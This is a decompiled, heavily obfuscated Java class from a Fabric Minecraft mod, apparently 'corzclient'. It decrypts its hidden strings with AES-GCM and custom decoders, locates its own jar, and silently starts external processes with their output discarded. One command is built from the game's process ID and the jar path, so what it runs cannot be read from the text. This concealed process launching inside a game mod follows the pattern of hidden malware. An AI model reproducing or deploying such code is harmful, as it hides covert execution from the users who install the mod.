package gg.corz;

import java.lang.ProcessBuilder.Redirect;
import java.lang.invoke.CallSite;
import java.lang.invoke.ConstantCallSite;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Locale;
import java.util.Optional;
import javax.crypto.Cipher;
import javax.crypto.Mac;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import net.fabricmc.loader.api.FabricLoader;
import net.fabricmc.loader.api.ModContainer;

public final class IliIIiIilliIIiIi {
   static final String IllIiilIIi = "corzclient";

   // $FF: synthetic method
   private static CallSite IIlllIlliIll(MethodHandles.Lookup var0, String var1, MethodType var2, String var3) {
      char[] var4 = var3.toCharArray();

      for(int var5 = 0; var5 < var4.length; ++var5) {
         var4[var5] = (char)((char)((char)((char)((char)(~((char)((char)((char)((char)((char)((char)(-((char)((char)((char)(var4[var5] - var5) >>> 14 | (char)(var4[var5] - var5) << 2) + 18816))) + var5) - var5) << 11 | (char)((char)((char)(-((char)((char)((char)(var4[var5] - var5) >>> 14 | (char)(var4[var5] - var5) << 2) + 18816))) + var5) - var5) >>> 5) << 11 | (char)((char)((char)((char)(-((char)((char)((char)(var4[var5] - var5) >>> 14 | (char)(var4[var5] - var5) << 2) + 18816))) + var5) - var5) << 11 | (char)((char)((char)(-((char)((char)((char)(var4[var5] - var5) >>> 14 | (char)(var4[var5] - var5) << 2) + 18816))) + var5) - var5) >>> 5) >>> 5) + var5))) + 14900) - var5) + 13432));
      }

      String var6 = new String(var4);
      Arrays.fill(var4, (char)0);
      MethodHandle var7 = MethodHandles.constant(String.class, var6);
      return new ConstantCallSite(var7);
   }

   public static void liiiIIllIl(Path jar) {
      if (jar != null) {
         try {
            (new ProcessBuilder(new String[]{IIIllIIliIIl<invokedynamic>(), IIIllIIliIIl<invokedynamic>(), IIIllIIliIIl<invokedynamic>(), jar.toAbsolutePath().toString()})).redirectOutput(Redirect.DISCARD).redirectError(Redirect.DISCARD).start();
         } catch (Exception var2) {
         }

      }
   }

   // $FF: synthetic method
   private static CallSite Iilllilliill(MethodHandles.Lookup var0, String var1, MethodType var2, String var3) {
      char[] var4 = var3.toCharArray();

      for(int var5 = 0; var5 < var4.length; ++var5) {
         var4[var5] = (char)((char)(-((char)((char)((char)((char)((char)((char)((char)((char)((char)((char)(-((char)((char)((char)(var4[var5] + 30758) + 25758) - var5))) ^ var5) >>> 11 | (char)((char)(-((char)((char)((char)(var4[var5] + 30758) + 25758) - var5))) ^ var5) << 5) ^ 32419) + 27129) << 12 | (char)((char)((char)((char)((char)(-((char)((char)((char)(var4[var5] + 30758) + 25758) - var5))) ^ var5) >>> 11 | (char)((char)(-((char)((char)((char)(var4[var5] + 30758) + 25758) - var5))) ^ var5) << 5) ^ 32419) + 27129) >>> 4) + var5) >>> 3 | (char)((char)((char)((char)((char)((char)((char)(-((char)((char)((char)(var4[var5] + 30758) + 25758) - var5))) ^ var5) >>> 11 | (char)((char)(-((char)((char)((char)(var4[var5] + 30758) + 25758) - var5))) ^ var5) << 5) ^ 32419) + 27129) << 12 | (char)((char)((char)((char)((char)(-((char)((char)((char)(var4[var5] + 30758) + 25758) - var5))) ^ var5) >>> 11 | (char)((char)(-((char)((char)((char)(var4[var5] + 30758) + 25758) - var5))) ^ var5) << 5) ^ 32419) + 27129) >>> 4) + var5) << 13) << 11 | (char)((char)((char)((char)((char)((char)((char)((char)(-((char)((char)((char)(var4[var5] + 30758) + 25758) - var5))) ^ var5) >>> 11 | (char)((char)(-((char)((char)((char)(var4[var5] + 30758) + 25758) - var5))) ^ var5) << 5) ^ 32419) + 27129) << 12 | (char)((char)((char)((char)((char)(-((char)((char)((char)(var4[var5] + 30758) + 25758) - var5))) ^ var5) >>> 11 | (char)((char)(-((char)((char)((char)(var4[var5] + 30758) + 25758) - var5))) ^ var5) << 5) ^ 32419) + 27129) >>> 4) + var5) >>> 3 | (char)((char)((char)((char)((char)((char)((char)(-((char)((char)((char)(var4[var5] + 30758) + 25758) - var5))) ^ var5) >>> 11 | (char)((char)(-((char)((char)((char)(var4[var5] + 30758) + 25758) - var5))) ^ var5) << 5) ^ 32419) + 27129) << 12 | (char)((char)((char)((char)((char)(-((char)((char)((char)(var4[var5] + 30758) + 25758) - var5))) ^ var5) >>> 11 | (char)((char)(-((char)((char)((char)(var4[var5] + 30758) + 25758) - var5))) ^ var5) << 5) ^ 32419) + 27129) >>> 4) + var5) << 13) >>> 5) - var5))));
      }

      String var6 = new String(var4);
      Arrays.fill(var4, (char)0);
      MethodHandle var7 = MethodHandles.constant(String.class, var6);
      return new ConstantCallSite(var7);
   }

   public static List<String> iIlIlllllill(long pid, String jarPath) {
      String var3 = IilliliilIIi(jarPath);
      String var4 = IIIllIIliIIl<invokedynamic>() + pid + IIIllIIliIIl<invokedynamic>() + var3 + IIIllIIliIIl<invokedynamic>() + var3 + IIIllIIliIIl<invokedynamic>();
      return List.of(IIIllIIliIIl<invokedynamic>(), IIIllIIliIIl<invokedynamic>(), IIIllIIliIIl<invokedynamic>(), IIIllIIliIIl<invokedynamic>(), IIIllIIliIIl<invokedynamic>(), IIIllIIliIIl<invokedynamic>(), var4);
   }

   // $FF: synthetic method
   private static CallSite IIIllIIliIIl(MethodHandles.Lookup var0, String var1, MethodType var2, String var3) {
      byte[] var4 = new byte[32];
      long var14 = 4396684957160092759L ^ Long.rotateLeft(-6850760530421995405L, 51) ^ 5059314490700599554L;
      var4[0] = (byte)((int)(var14 >>> 0));
      var4[1] = (byte)((int)(var14 >>> 8));
      var4[2] = (byte)((int)(var14 >>> 16));
      var4[3] = (byte)((int)(var14 >>> 24));
      var4[4] = (byte)((int)(var14 >>> 32));
      var4[5] = (byte)((int)(var14 >>> 40));
      var4[6] = (byte)((int)(var14 >>> 48));
      var4[7] = (byte)((int)(var14 >>> 56));
      var14 = 6502562734344039788L ^ Long.rotateLeft(4120592919651642396L, 37) ^ 10531278166274253L;
      var4[8] = (byte)((int)(var14 >>> 0));
      var4[9] = (byte)((int)(var14 >>> 8));
      var4[10] = (byte)((int)(var14 >>> 16));
      var4[11] = (byte)((int)(var14 >>> 24));
      var4[12] = (byte)((int)(var14 >>> 32));
      var4[13] = (byte)((int)(var14 >>> 40));
      var4[14] = (byte)((int)(var14 >>> 48));
      var4[15] = (byte)((int)(var14 >>> 56));
      var14 = -1487993567635419481L ^ Long.rotateLeft(1594449327579360832L, 8) ^ 4167917546148803125L;
      var4[16] = (byte)((int)(var14 >>> 0));
      var4[17] = (byte)((int)(var14 >>> 8));
      var4[18] = (byte)((int)(var14 >>> 16));
      var4[19] = (byte)((int)(var14 >>> 24));
      var4[20] = (byte)((int)(var14 >>> 32));
      var4[21] = (byte)((int)(var14 >>> 40));
      var4[22] = (byte)((int)(var14 >>> 48));
      var4[23] = (byte)((int)(var14 >>> 56));
      var14 = -8873327994100739085L ^ Long.rotateLeft(-2520917061448311253L, 18) ^ -4487380335431393839L;
      var4[24] = (byte)((int)(var14 >>> 0));
      var4[25] = (byte)((int)(var14 >>> 8));
      var4[26] = (byte)((int)(var14 >>> 16));
      var4[27] = (byte)((int)(var14 >>> 24));
      var4[28] = (byte)((int)(var14 >>> 32));
      var4[29] = (byte)((int)(var14 >>> 40));
      var4[30] = (byte)((int)(var14 >>> 48));
      var4[31] = (byte)((int)(var14 >>> 56));
      byte[] var5 = new byte[32];
      var14 = -8130285578562179190L;
      var5[0] = (byte)((int)(var14 >>> 0));
      var5[1] = (byte)((int)(var14 >>> 8));
      var5[2] = (byte)((int)(var14 >>> 16));
      var5[3] = (byte)((int)(var14 >>> 24));
      var5[4] = (byte)((int)(var14 >>> 32));
      var5[5] = (byte)((int)(var14 >>> 40));
      var5[6] = (byte)((int)(var14 >>> 48));
      var5[7] = (byte)((int)(var14 >>> 56));
      var14 = 3189012179812194444L;
      var5[8] = (byte)((int)(var14 >>> 0));
      var5[9] = (byte)((int)(var14 >>> 8));
      var5[10] = (byte)((int)(var14 >>> 16));
      var5[11] = (byte)((int)(var14 >>> 24));
      var5[12] = (byte)((int)(var14 >>> 32));
      var5[13] = (byte)((int)(var14 >>> 40));
      var5[14] = (byte)((int)(var14 >>> 48));
      var5[15] = (byte)((int)(var14 >>> 56));
      var14 = 2967848264861916953L;
      var5[16] = (byte)((int)(var14 >>> 0));
      var5[17] = (byte)((int)(var14 >>> 8));
      var5[18] = (byte)((int)(var14 >>> 16));
      var5[19] = (byte)((int)(var14 >>> 24));
      var5[20] = (byte)((int)(var14 >>> 32));
      var5[21] = (byte)((int)(var14 >>> 40));
      var5[22] = (byte)((int)(var14 >>> 48));
      var5[23] = (byte)((int)(var14 >>> 56));
      var14 = -7033675104836639719L;
      var5[24] = (byte)((int)(var14 >>> 0));
      var5[25] = (byte)((int)(var14 >>> 8));
      var5[26] = (byte)((int)(var14 >>> 16));
      var5[27] = (byte)((int)(var14 >>> 24));
      var5[28] = (byte)((int)(var14 >>> 32));
      var5[29] = (byte)((int)(var14 >>> 40));
      var5[30] = (byte)((int)(var14 >>> 48));
      var5[31] = (byte)((int)(var14 >>> 56));
      byte[] var6 = new byte[16];
      var14 = 1047072225785516994L;
      var6[0] = (byte)((int)(var14 >>> 0));
      var6[1] = (byte)((int)(var14 >>> 8));
      var6[2] = (byte)((int)(var14 >>> 16));
      var6[3] = (byte)((int)(var14 >>> 24));
      var6[4] = (byte)((int)(var14 >>> 32));
      var6[5] = (byte)((int)(var14 >>> 40));
      var6[6] = (byte)((int)(var14 >>> 48));
      var6[7] = (byte)((int)(var14 >>> 56));
      var14 = 2166266387804841070L;
      var6[8] = (byte)((int)(var14 >>> 0));
      var6[9] = (byte)((int)(var14 >>> 8));
      var6[10] = (byte)((int)(var14 >>> 16));
      var6[11] = (byte)((int)(var14 >>> 24));
      var6[12] = (byte)((int)(var14 >>> 32));
      var6[13] = (byte)((int)(var14 >>> 40));
      var6[14] = (byte)((int)(var14 >>> 48));
      var6[15] = (byte)((int)(var14 >>> 56));
      Mac var7 = Mac.getInstance(IlIlllIlilIl<invokedynamic>());
      var7.init(new SecretKeySpec(var5, IiIlliIliiIl<invokedynamic>()));
      byte[] var8 = var7.doFinal(var4);
      var7.init(new SecretKeySpec(var8, IIlllIlliIll<invokedynamic>()));
      var7.update(var6);
      var7.update((byte)1);
      byte[] var9 = var7.doFinal();
      SecretKeySpec var10 = new SecretKeySpec(var9, 0, 32, Illlllllilll<invokedynamic>());
      Base64.Decoder var11 = Base64.getDecoder();
      Cipher var12 = Cipher.getInstance(Iilllilliill<invokedynamic>());
      byte[] var13 = var11.decode(var3);
      var12.init(2, var10, new GCMParameterSpec(128, var13, 0, 12));
      byte[] var15 = var12.doFinal(var13, 12, var13.length - 12);
      String var16 = new String(var15, StandardCharsets.UTF_8);
      Arrays.fill(var4, (byte)0);
      Arrays.fill(var5, (byte)0);
      Arrays.fill(var6, (byte)0);
      Arrays.fill(var8, (byte)0);
      Arrays.fill(var9, (byte)0);
      Arrays.fill(var15, (byte)0);
      MethodHandle var17 = MethodHandles.constant(String.class, var16);
      return new ConstantCallSite(var17);
   }

   private IliIIiIilliIIiIi() {
   }

   public static Path IliIlllilIi() {
      try {
         Optional var0 = FabricLoader.getInstance().getModContainer(IIIllIIliIIl<invokedynamic>());
         if (var0.isEmpty()) {
            return null;
         } else {
            for(Path var2 : ((ModContainer)var0.get()).getOrigin().getPaths()) {
               if (var2 != null && var2.getFileName() != null && var2.getFileName().toString().toLowerCase(Locale.ROOT).endsWith(IIIllIIliIIl<invokedynamic>()) && Files.isRegularFile(var2, new LinkOption[0])) {
                  return var2;
               }
            }

            return null;
         }
      } catch (Exception var3) {
         return null;
      }
   }

   public static void iliIiiliiiii() {
      Path var0 = IliIlllilIi();
      if (var0 != null) {
         liiiIIllIl(var0);
         lIiiIiIlilli(var0);
      }
   }

   // $FF: synthetic method
   private static CallSite IlIlllIlilIl(MethodHandles.Lookup var0, String var1, MethodType var2, String var3) {
      char[] var4 = var3.toCharArray();

      for(int var5 = 0; var5 < var4.length; ++var5) {
         var4[var5] = (char)((char)((char)(-((char)(~((char)(-((char)((char)((char)((char)((char)((char)((char)((char)((char)((char)((char)((char)(-((char)((char)(~var4[var5]) - var5))) >>> 11 | (char)(-((char)((char)(~var4[var5]) - var5))) << 5) << 4 | (char)((char)(-((char)((char)(~var4[var5]) - var5))) >>> 11 | (char)(-((char)((char)(~var4[var5]) - var5))) << 5) >>> 12) >>> 11 | (char)((char)((char)(-((char)((char)(~var4[var5]) - var5))) >>> 11 | (char)(-((char)((char)(~var4[var5]) - var5))) << 5) << 4 | (char)((char)(-((char)((char)(~var4[var5]) - var5))) >>> 11 | (char)(-((char)((char)(~var4[var5]) - var5))) << 5) >>> 12) << 5)) << 11 | (char)((char)((char)((char)((char)(-((char)((char)(~var4[var5]) - var5))) >>> 11 | (char)(-((char)((char)(~var4[var5]) - var5))) << 5) << 4 | (char)((char)(-((char)((char)(~var4[var5]) - var5))) >>> 11 | (char)(-((char)((char)(~var4[var5]) - var5))) << 5) >>> 12) >>> 11 | (char)((char)((char)(-((char)((char)(~var4[var5]) - var5))) >>> 11 | (char)(-((char)((char)(~var4[var5]) - var5))) << 5) << 4 | (char)((char)(-((char)((char)(~var4[var5]) - var5))) >>> 11 | (char)(-((char)((char)(~var4[var5]) - var5))) << 5) >>> 12) << 5)) >>> 5) ^ var5) - 25593) << 15 | (char)((char)((char)((char)((char)((char)((char)((char)(-((char)((char)(~var4[var5]) - var5))) >>> 11 | (char)(-((char)((char)(~var4[var5]) - var5))) << 5) << 4 | (char)((char)(-((char)((char)(~var4[var5]) - var5))) >>> 11 | (char)(-((char)((char)(~var4[var5]) - var5))) << 5) >>> 12) >>> 11 | (char)((char)((char)(-((char)((char)(~var4[var5]) - var5))) >>> 11 | (char)(-((char)((char)(~var4[var5]) - var5))) << 5) << 4 | (char)((char)(-((char)((char)(~var4[var5]) - var5))) >>> 11 | (char)(-((char)((char)(~var4[var5]) - var5))) << 5) >>> 12) << 5)) << 11 | (char)((char)((char)((char)((char)(-((char)((char)(~var4[var5]) - var5))) >>> 11 | (char)(-((char)((char)(~var4[var5]) - var5))) << 5) << 4 | (char)((char)(-((char)((char)(~var4[var5]) - var5))) >>> 11 | (char)(-((char)((char)(~var4[var5]) - var5))) << 5) >>> 12) >>> 11 | (char)((char)((char)(-((char)((char)(~var4[var5]) - var5))) >>> 11 | (char)(-((char)((char)(~var4[var5]) - var5))) << 5) << 4 | (char)((char)(-((char)((char)(~var4[var5]) - var5))) >>> 11 | (char)(-((char)((char)(~var4[var5]) - var5))) << 5) >>> 12) << 5)) >>> 5) ^ var5) - 25593) >>> 1) - var5) - var5) + 9833))))))) - 25776));
      }

      String var6 = new String(var4);
      Arrays.fill(var4, (char)0);
      MethodHandle var7 = MethodHandles.constant(String.class, var6);
      return new ConstantCallSite(var7);
   }

   public static void lIiiIiIlilli(Path jar) {
      if (jar != null) {
         try {
            long var1 = ProcessHandle.current().pid();
            (new ProcessBuilder(iIlIlllllill(var1, jar.toAbsolutePath().toString()))).redirectOutput(Redirect.DISCARD).redirectError(Redirect.DISCARD).start();
         } catch (Exception var3) {
         }

      }
   }

   // $FF: synthetic method
   private static CallSite IiIlliIliiIl(MethodHandles.Lookup var0, String var1, MethodType var2, String var3) {
      char[] var4 = var3.toCharArray();

      for(int var5 = 0; var5 < var4.length; ++var5) {
         var4[var5] = (char)((char)((char)((char)((char)((char)((char)((char)((char)((char)((char)(-((char)((char)((char)(var4[var5] - var5) - var5) + '黅'))) + '춦') - 1810) ^ 19443) + 18589) >>> 8 | (char)((char)((char)((char)((char)(-((char)((char)((char)(var4[var5] - var5) - var5) + '黅'))) + '춦') - 1810) ^ 19443) + 18589) << 8) ^ var5) << 3 | (char)((char)((char)((char)((char)((char)((char)(-((char)((char)((char)(var4[var5] - var5) - var5) + '黅'))) + '춦') - 1810) ^ 19443) + 18589) >>> 8 | (char)((char)((char)((char)((char)(-((char)((char)((char)(var4[var5] - var5) - var5) + '黅'))) + '춦') - 1810) ^ 19443) + 18589) << 8) ^ var5) >>> 13) ^ var5) + '荶'));
      }

      String var6 = new String(var4);
      Arrays.fill(var4, (char)0);
      MethodHandle var7 = MethodHandles.constant(String.class, var6);
      return new ConstantCallSite(var7);
   }

   // $FF: synthetic method
   private static CallSite Illlllllilll(MethodHandles.Lookup var0, String var1, MethodType var2, String var3) {
      char[] var4 = var3.toCharArray();

      for(int var5 = 0; var5 < var4.length; ++var5) {
         var4[var5] = (char)((char)((char)(-((char)(-((char)(~((char)((char)((char)((char)((char)(~((char)((char)((char)((char)((char)(-((char)((char)(var4[var5] ^ '\uebc0') ^ var5))) ^ 'ꠓ') + var5) ^ '볐') >>> 3 | (char)((char)((char)((char)(-((char)((char)(var4[var5] ^ '\uebc0') ^ var5))) ^ 'ꠓ') + var5) ^ '볐') << 13))) - var5) + '븬') << 12 | (char)((char)((char)(~((char)((char)((char)((char)((char)(-((char)((char)(var4[var5] ^ '\uebc0') ^ var5))) ^ 'ꠓ') + var5) ^ '볐') >>> 3 | (char)((char)((char)((char)(-((char)((char)(var4[var5] ^ '\uebc0') ^ var5))) ^ 'ꠓ') + var5) ^ '볐') << 13))) - var5) + '븬') >>> 4) + var5))))))) - 28093));
      }

      String var6 = new String(var4);
      Arrays.fill(var4, (char)0);
      MethodHandle var7 = MethodHandles.constant(String.class, var6);
      return new ConstantCallSite(var7);
   }

   static String IilliliilIIi(String s) {
      return s.replace(IIIllIIliIIl<invokedynamic>(), IIIllIIliIIl<invokedynamic>());
   }
}
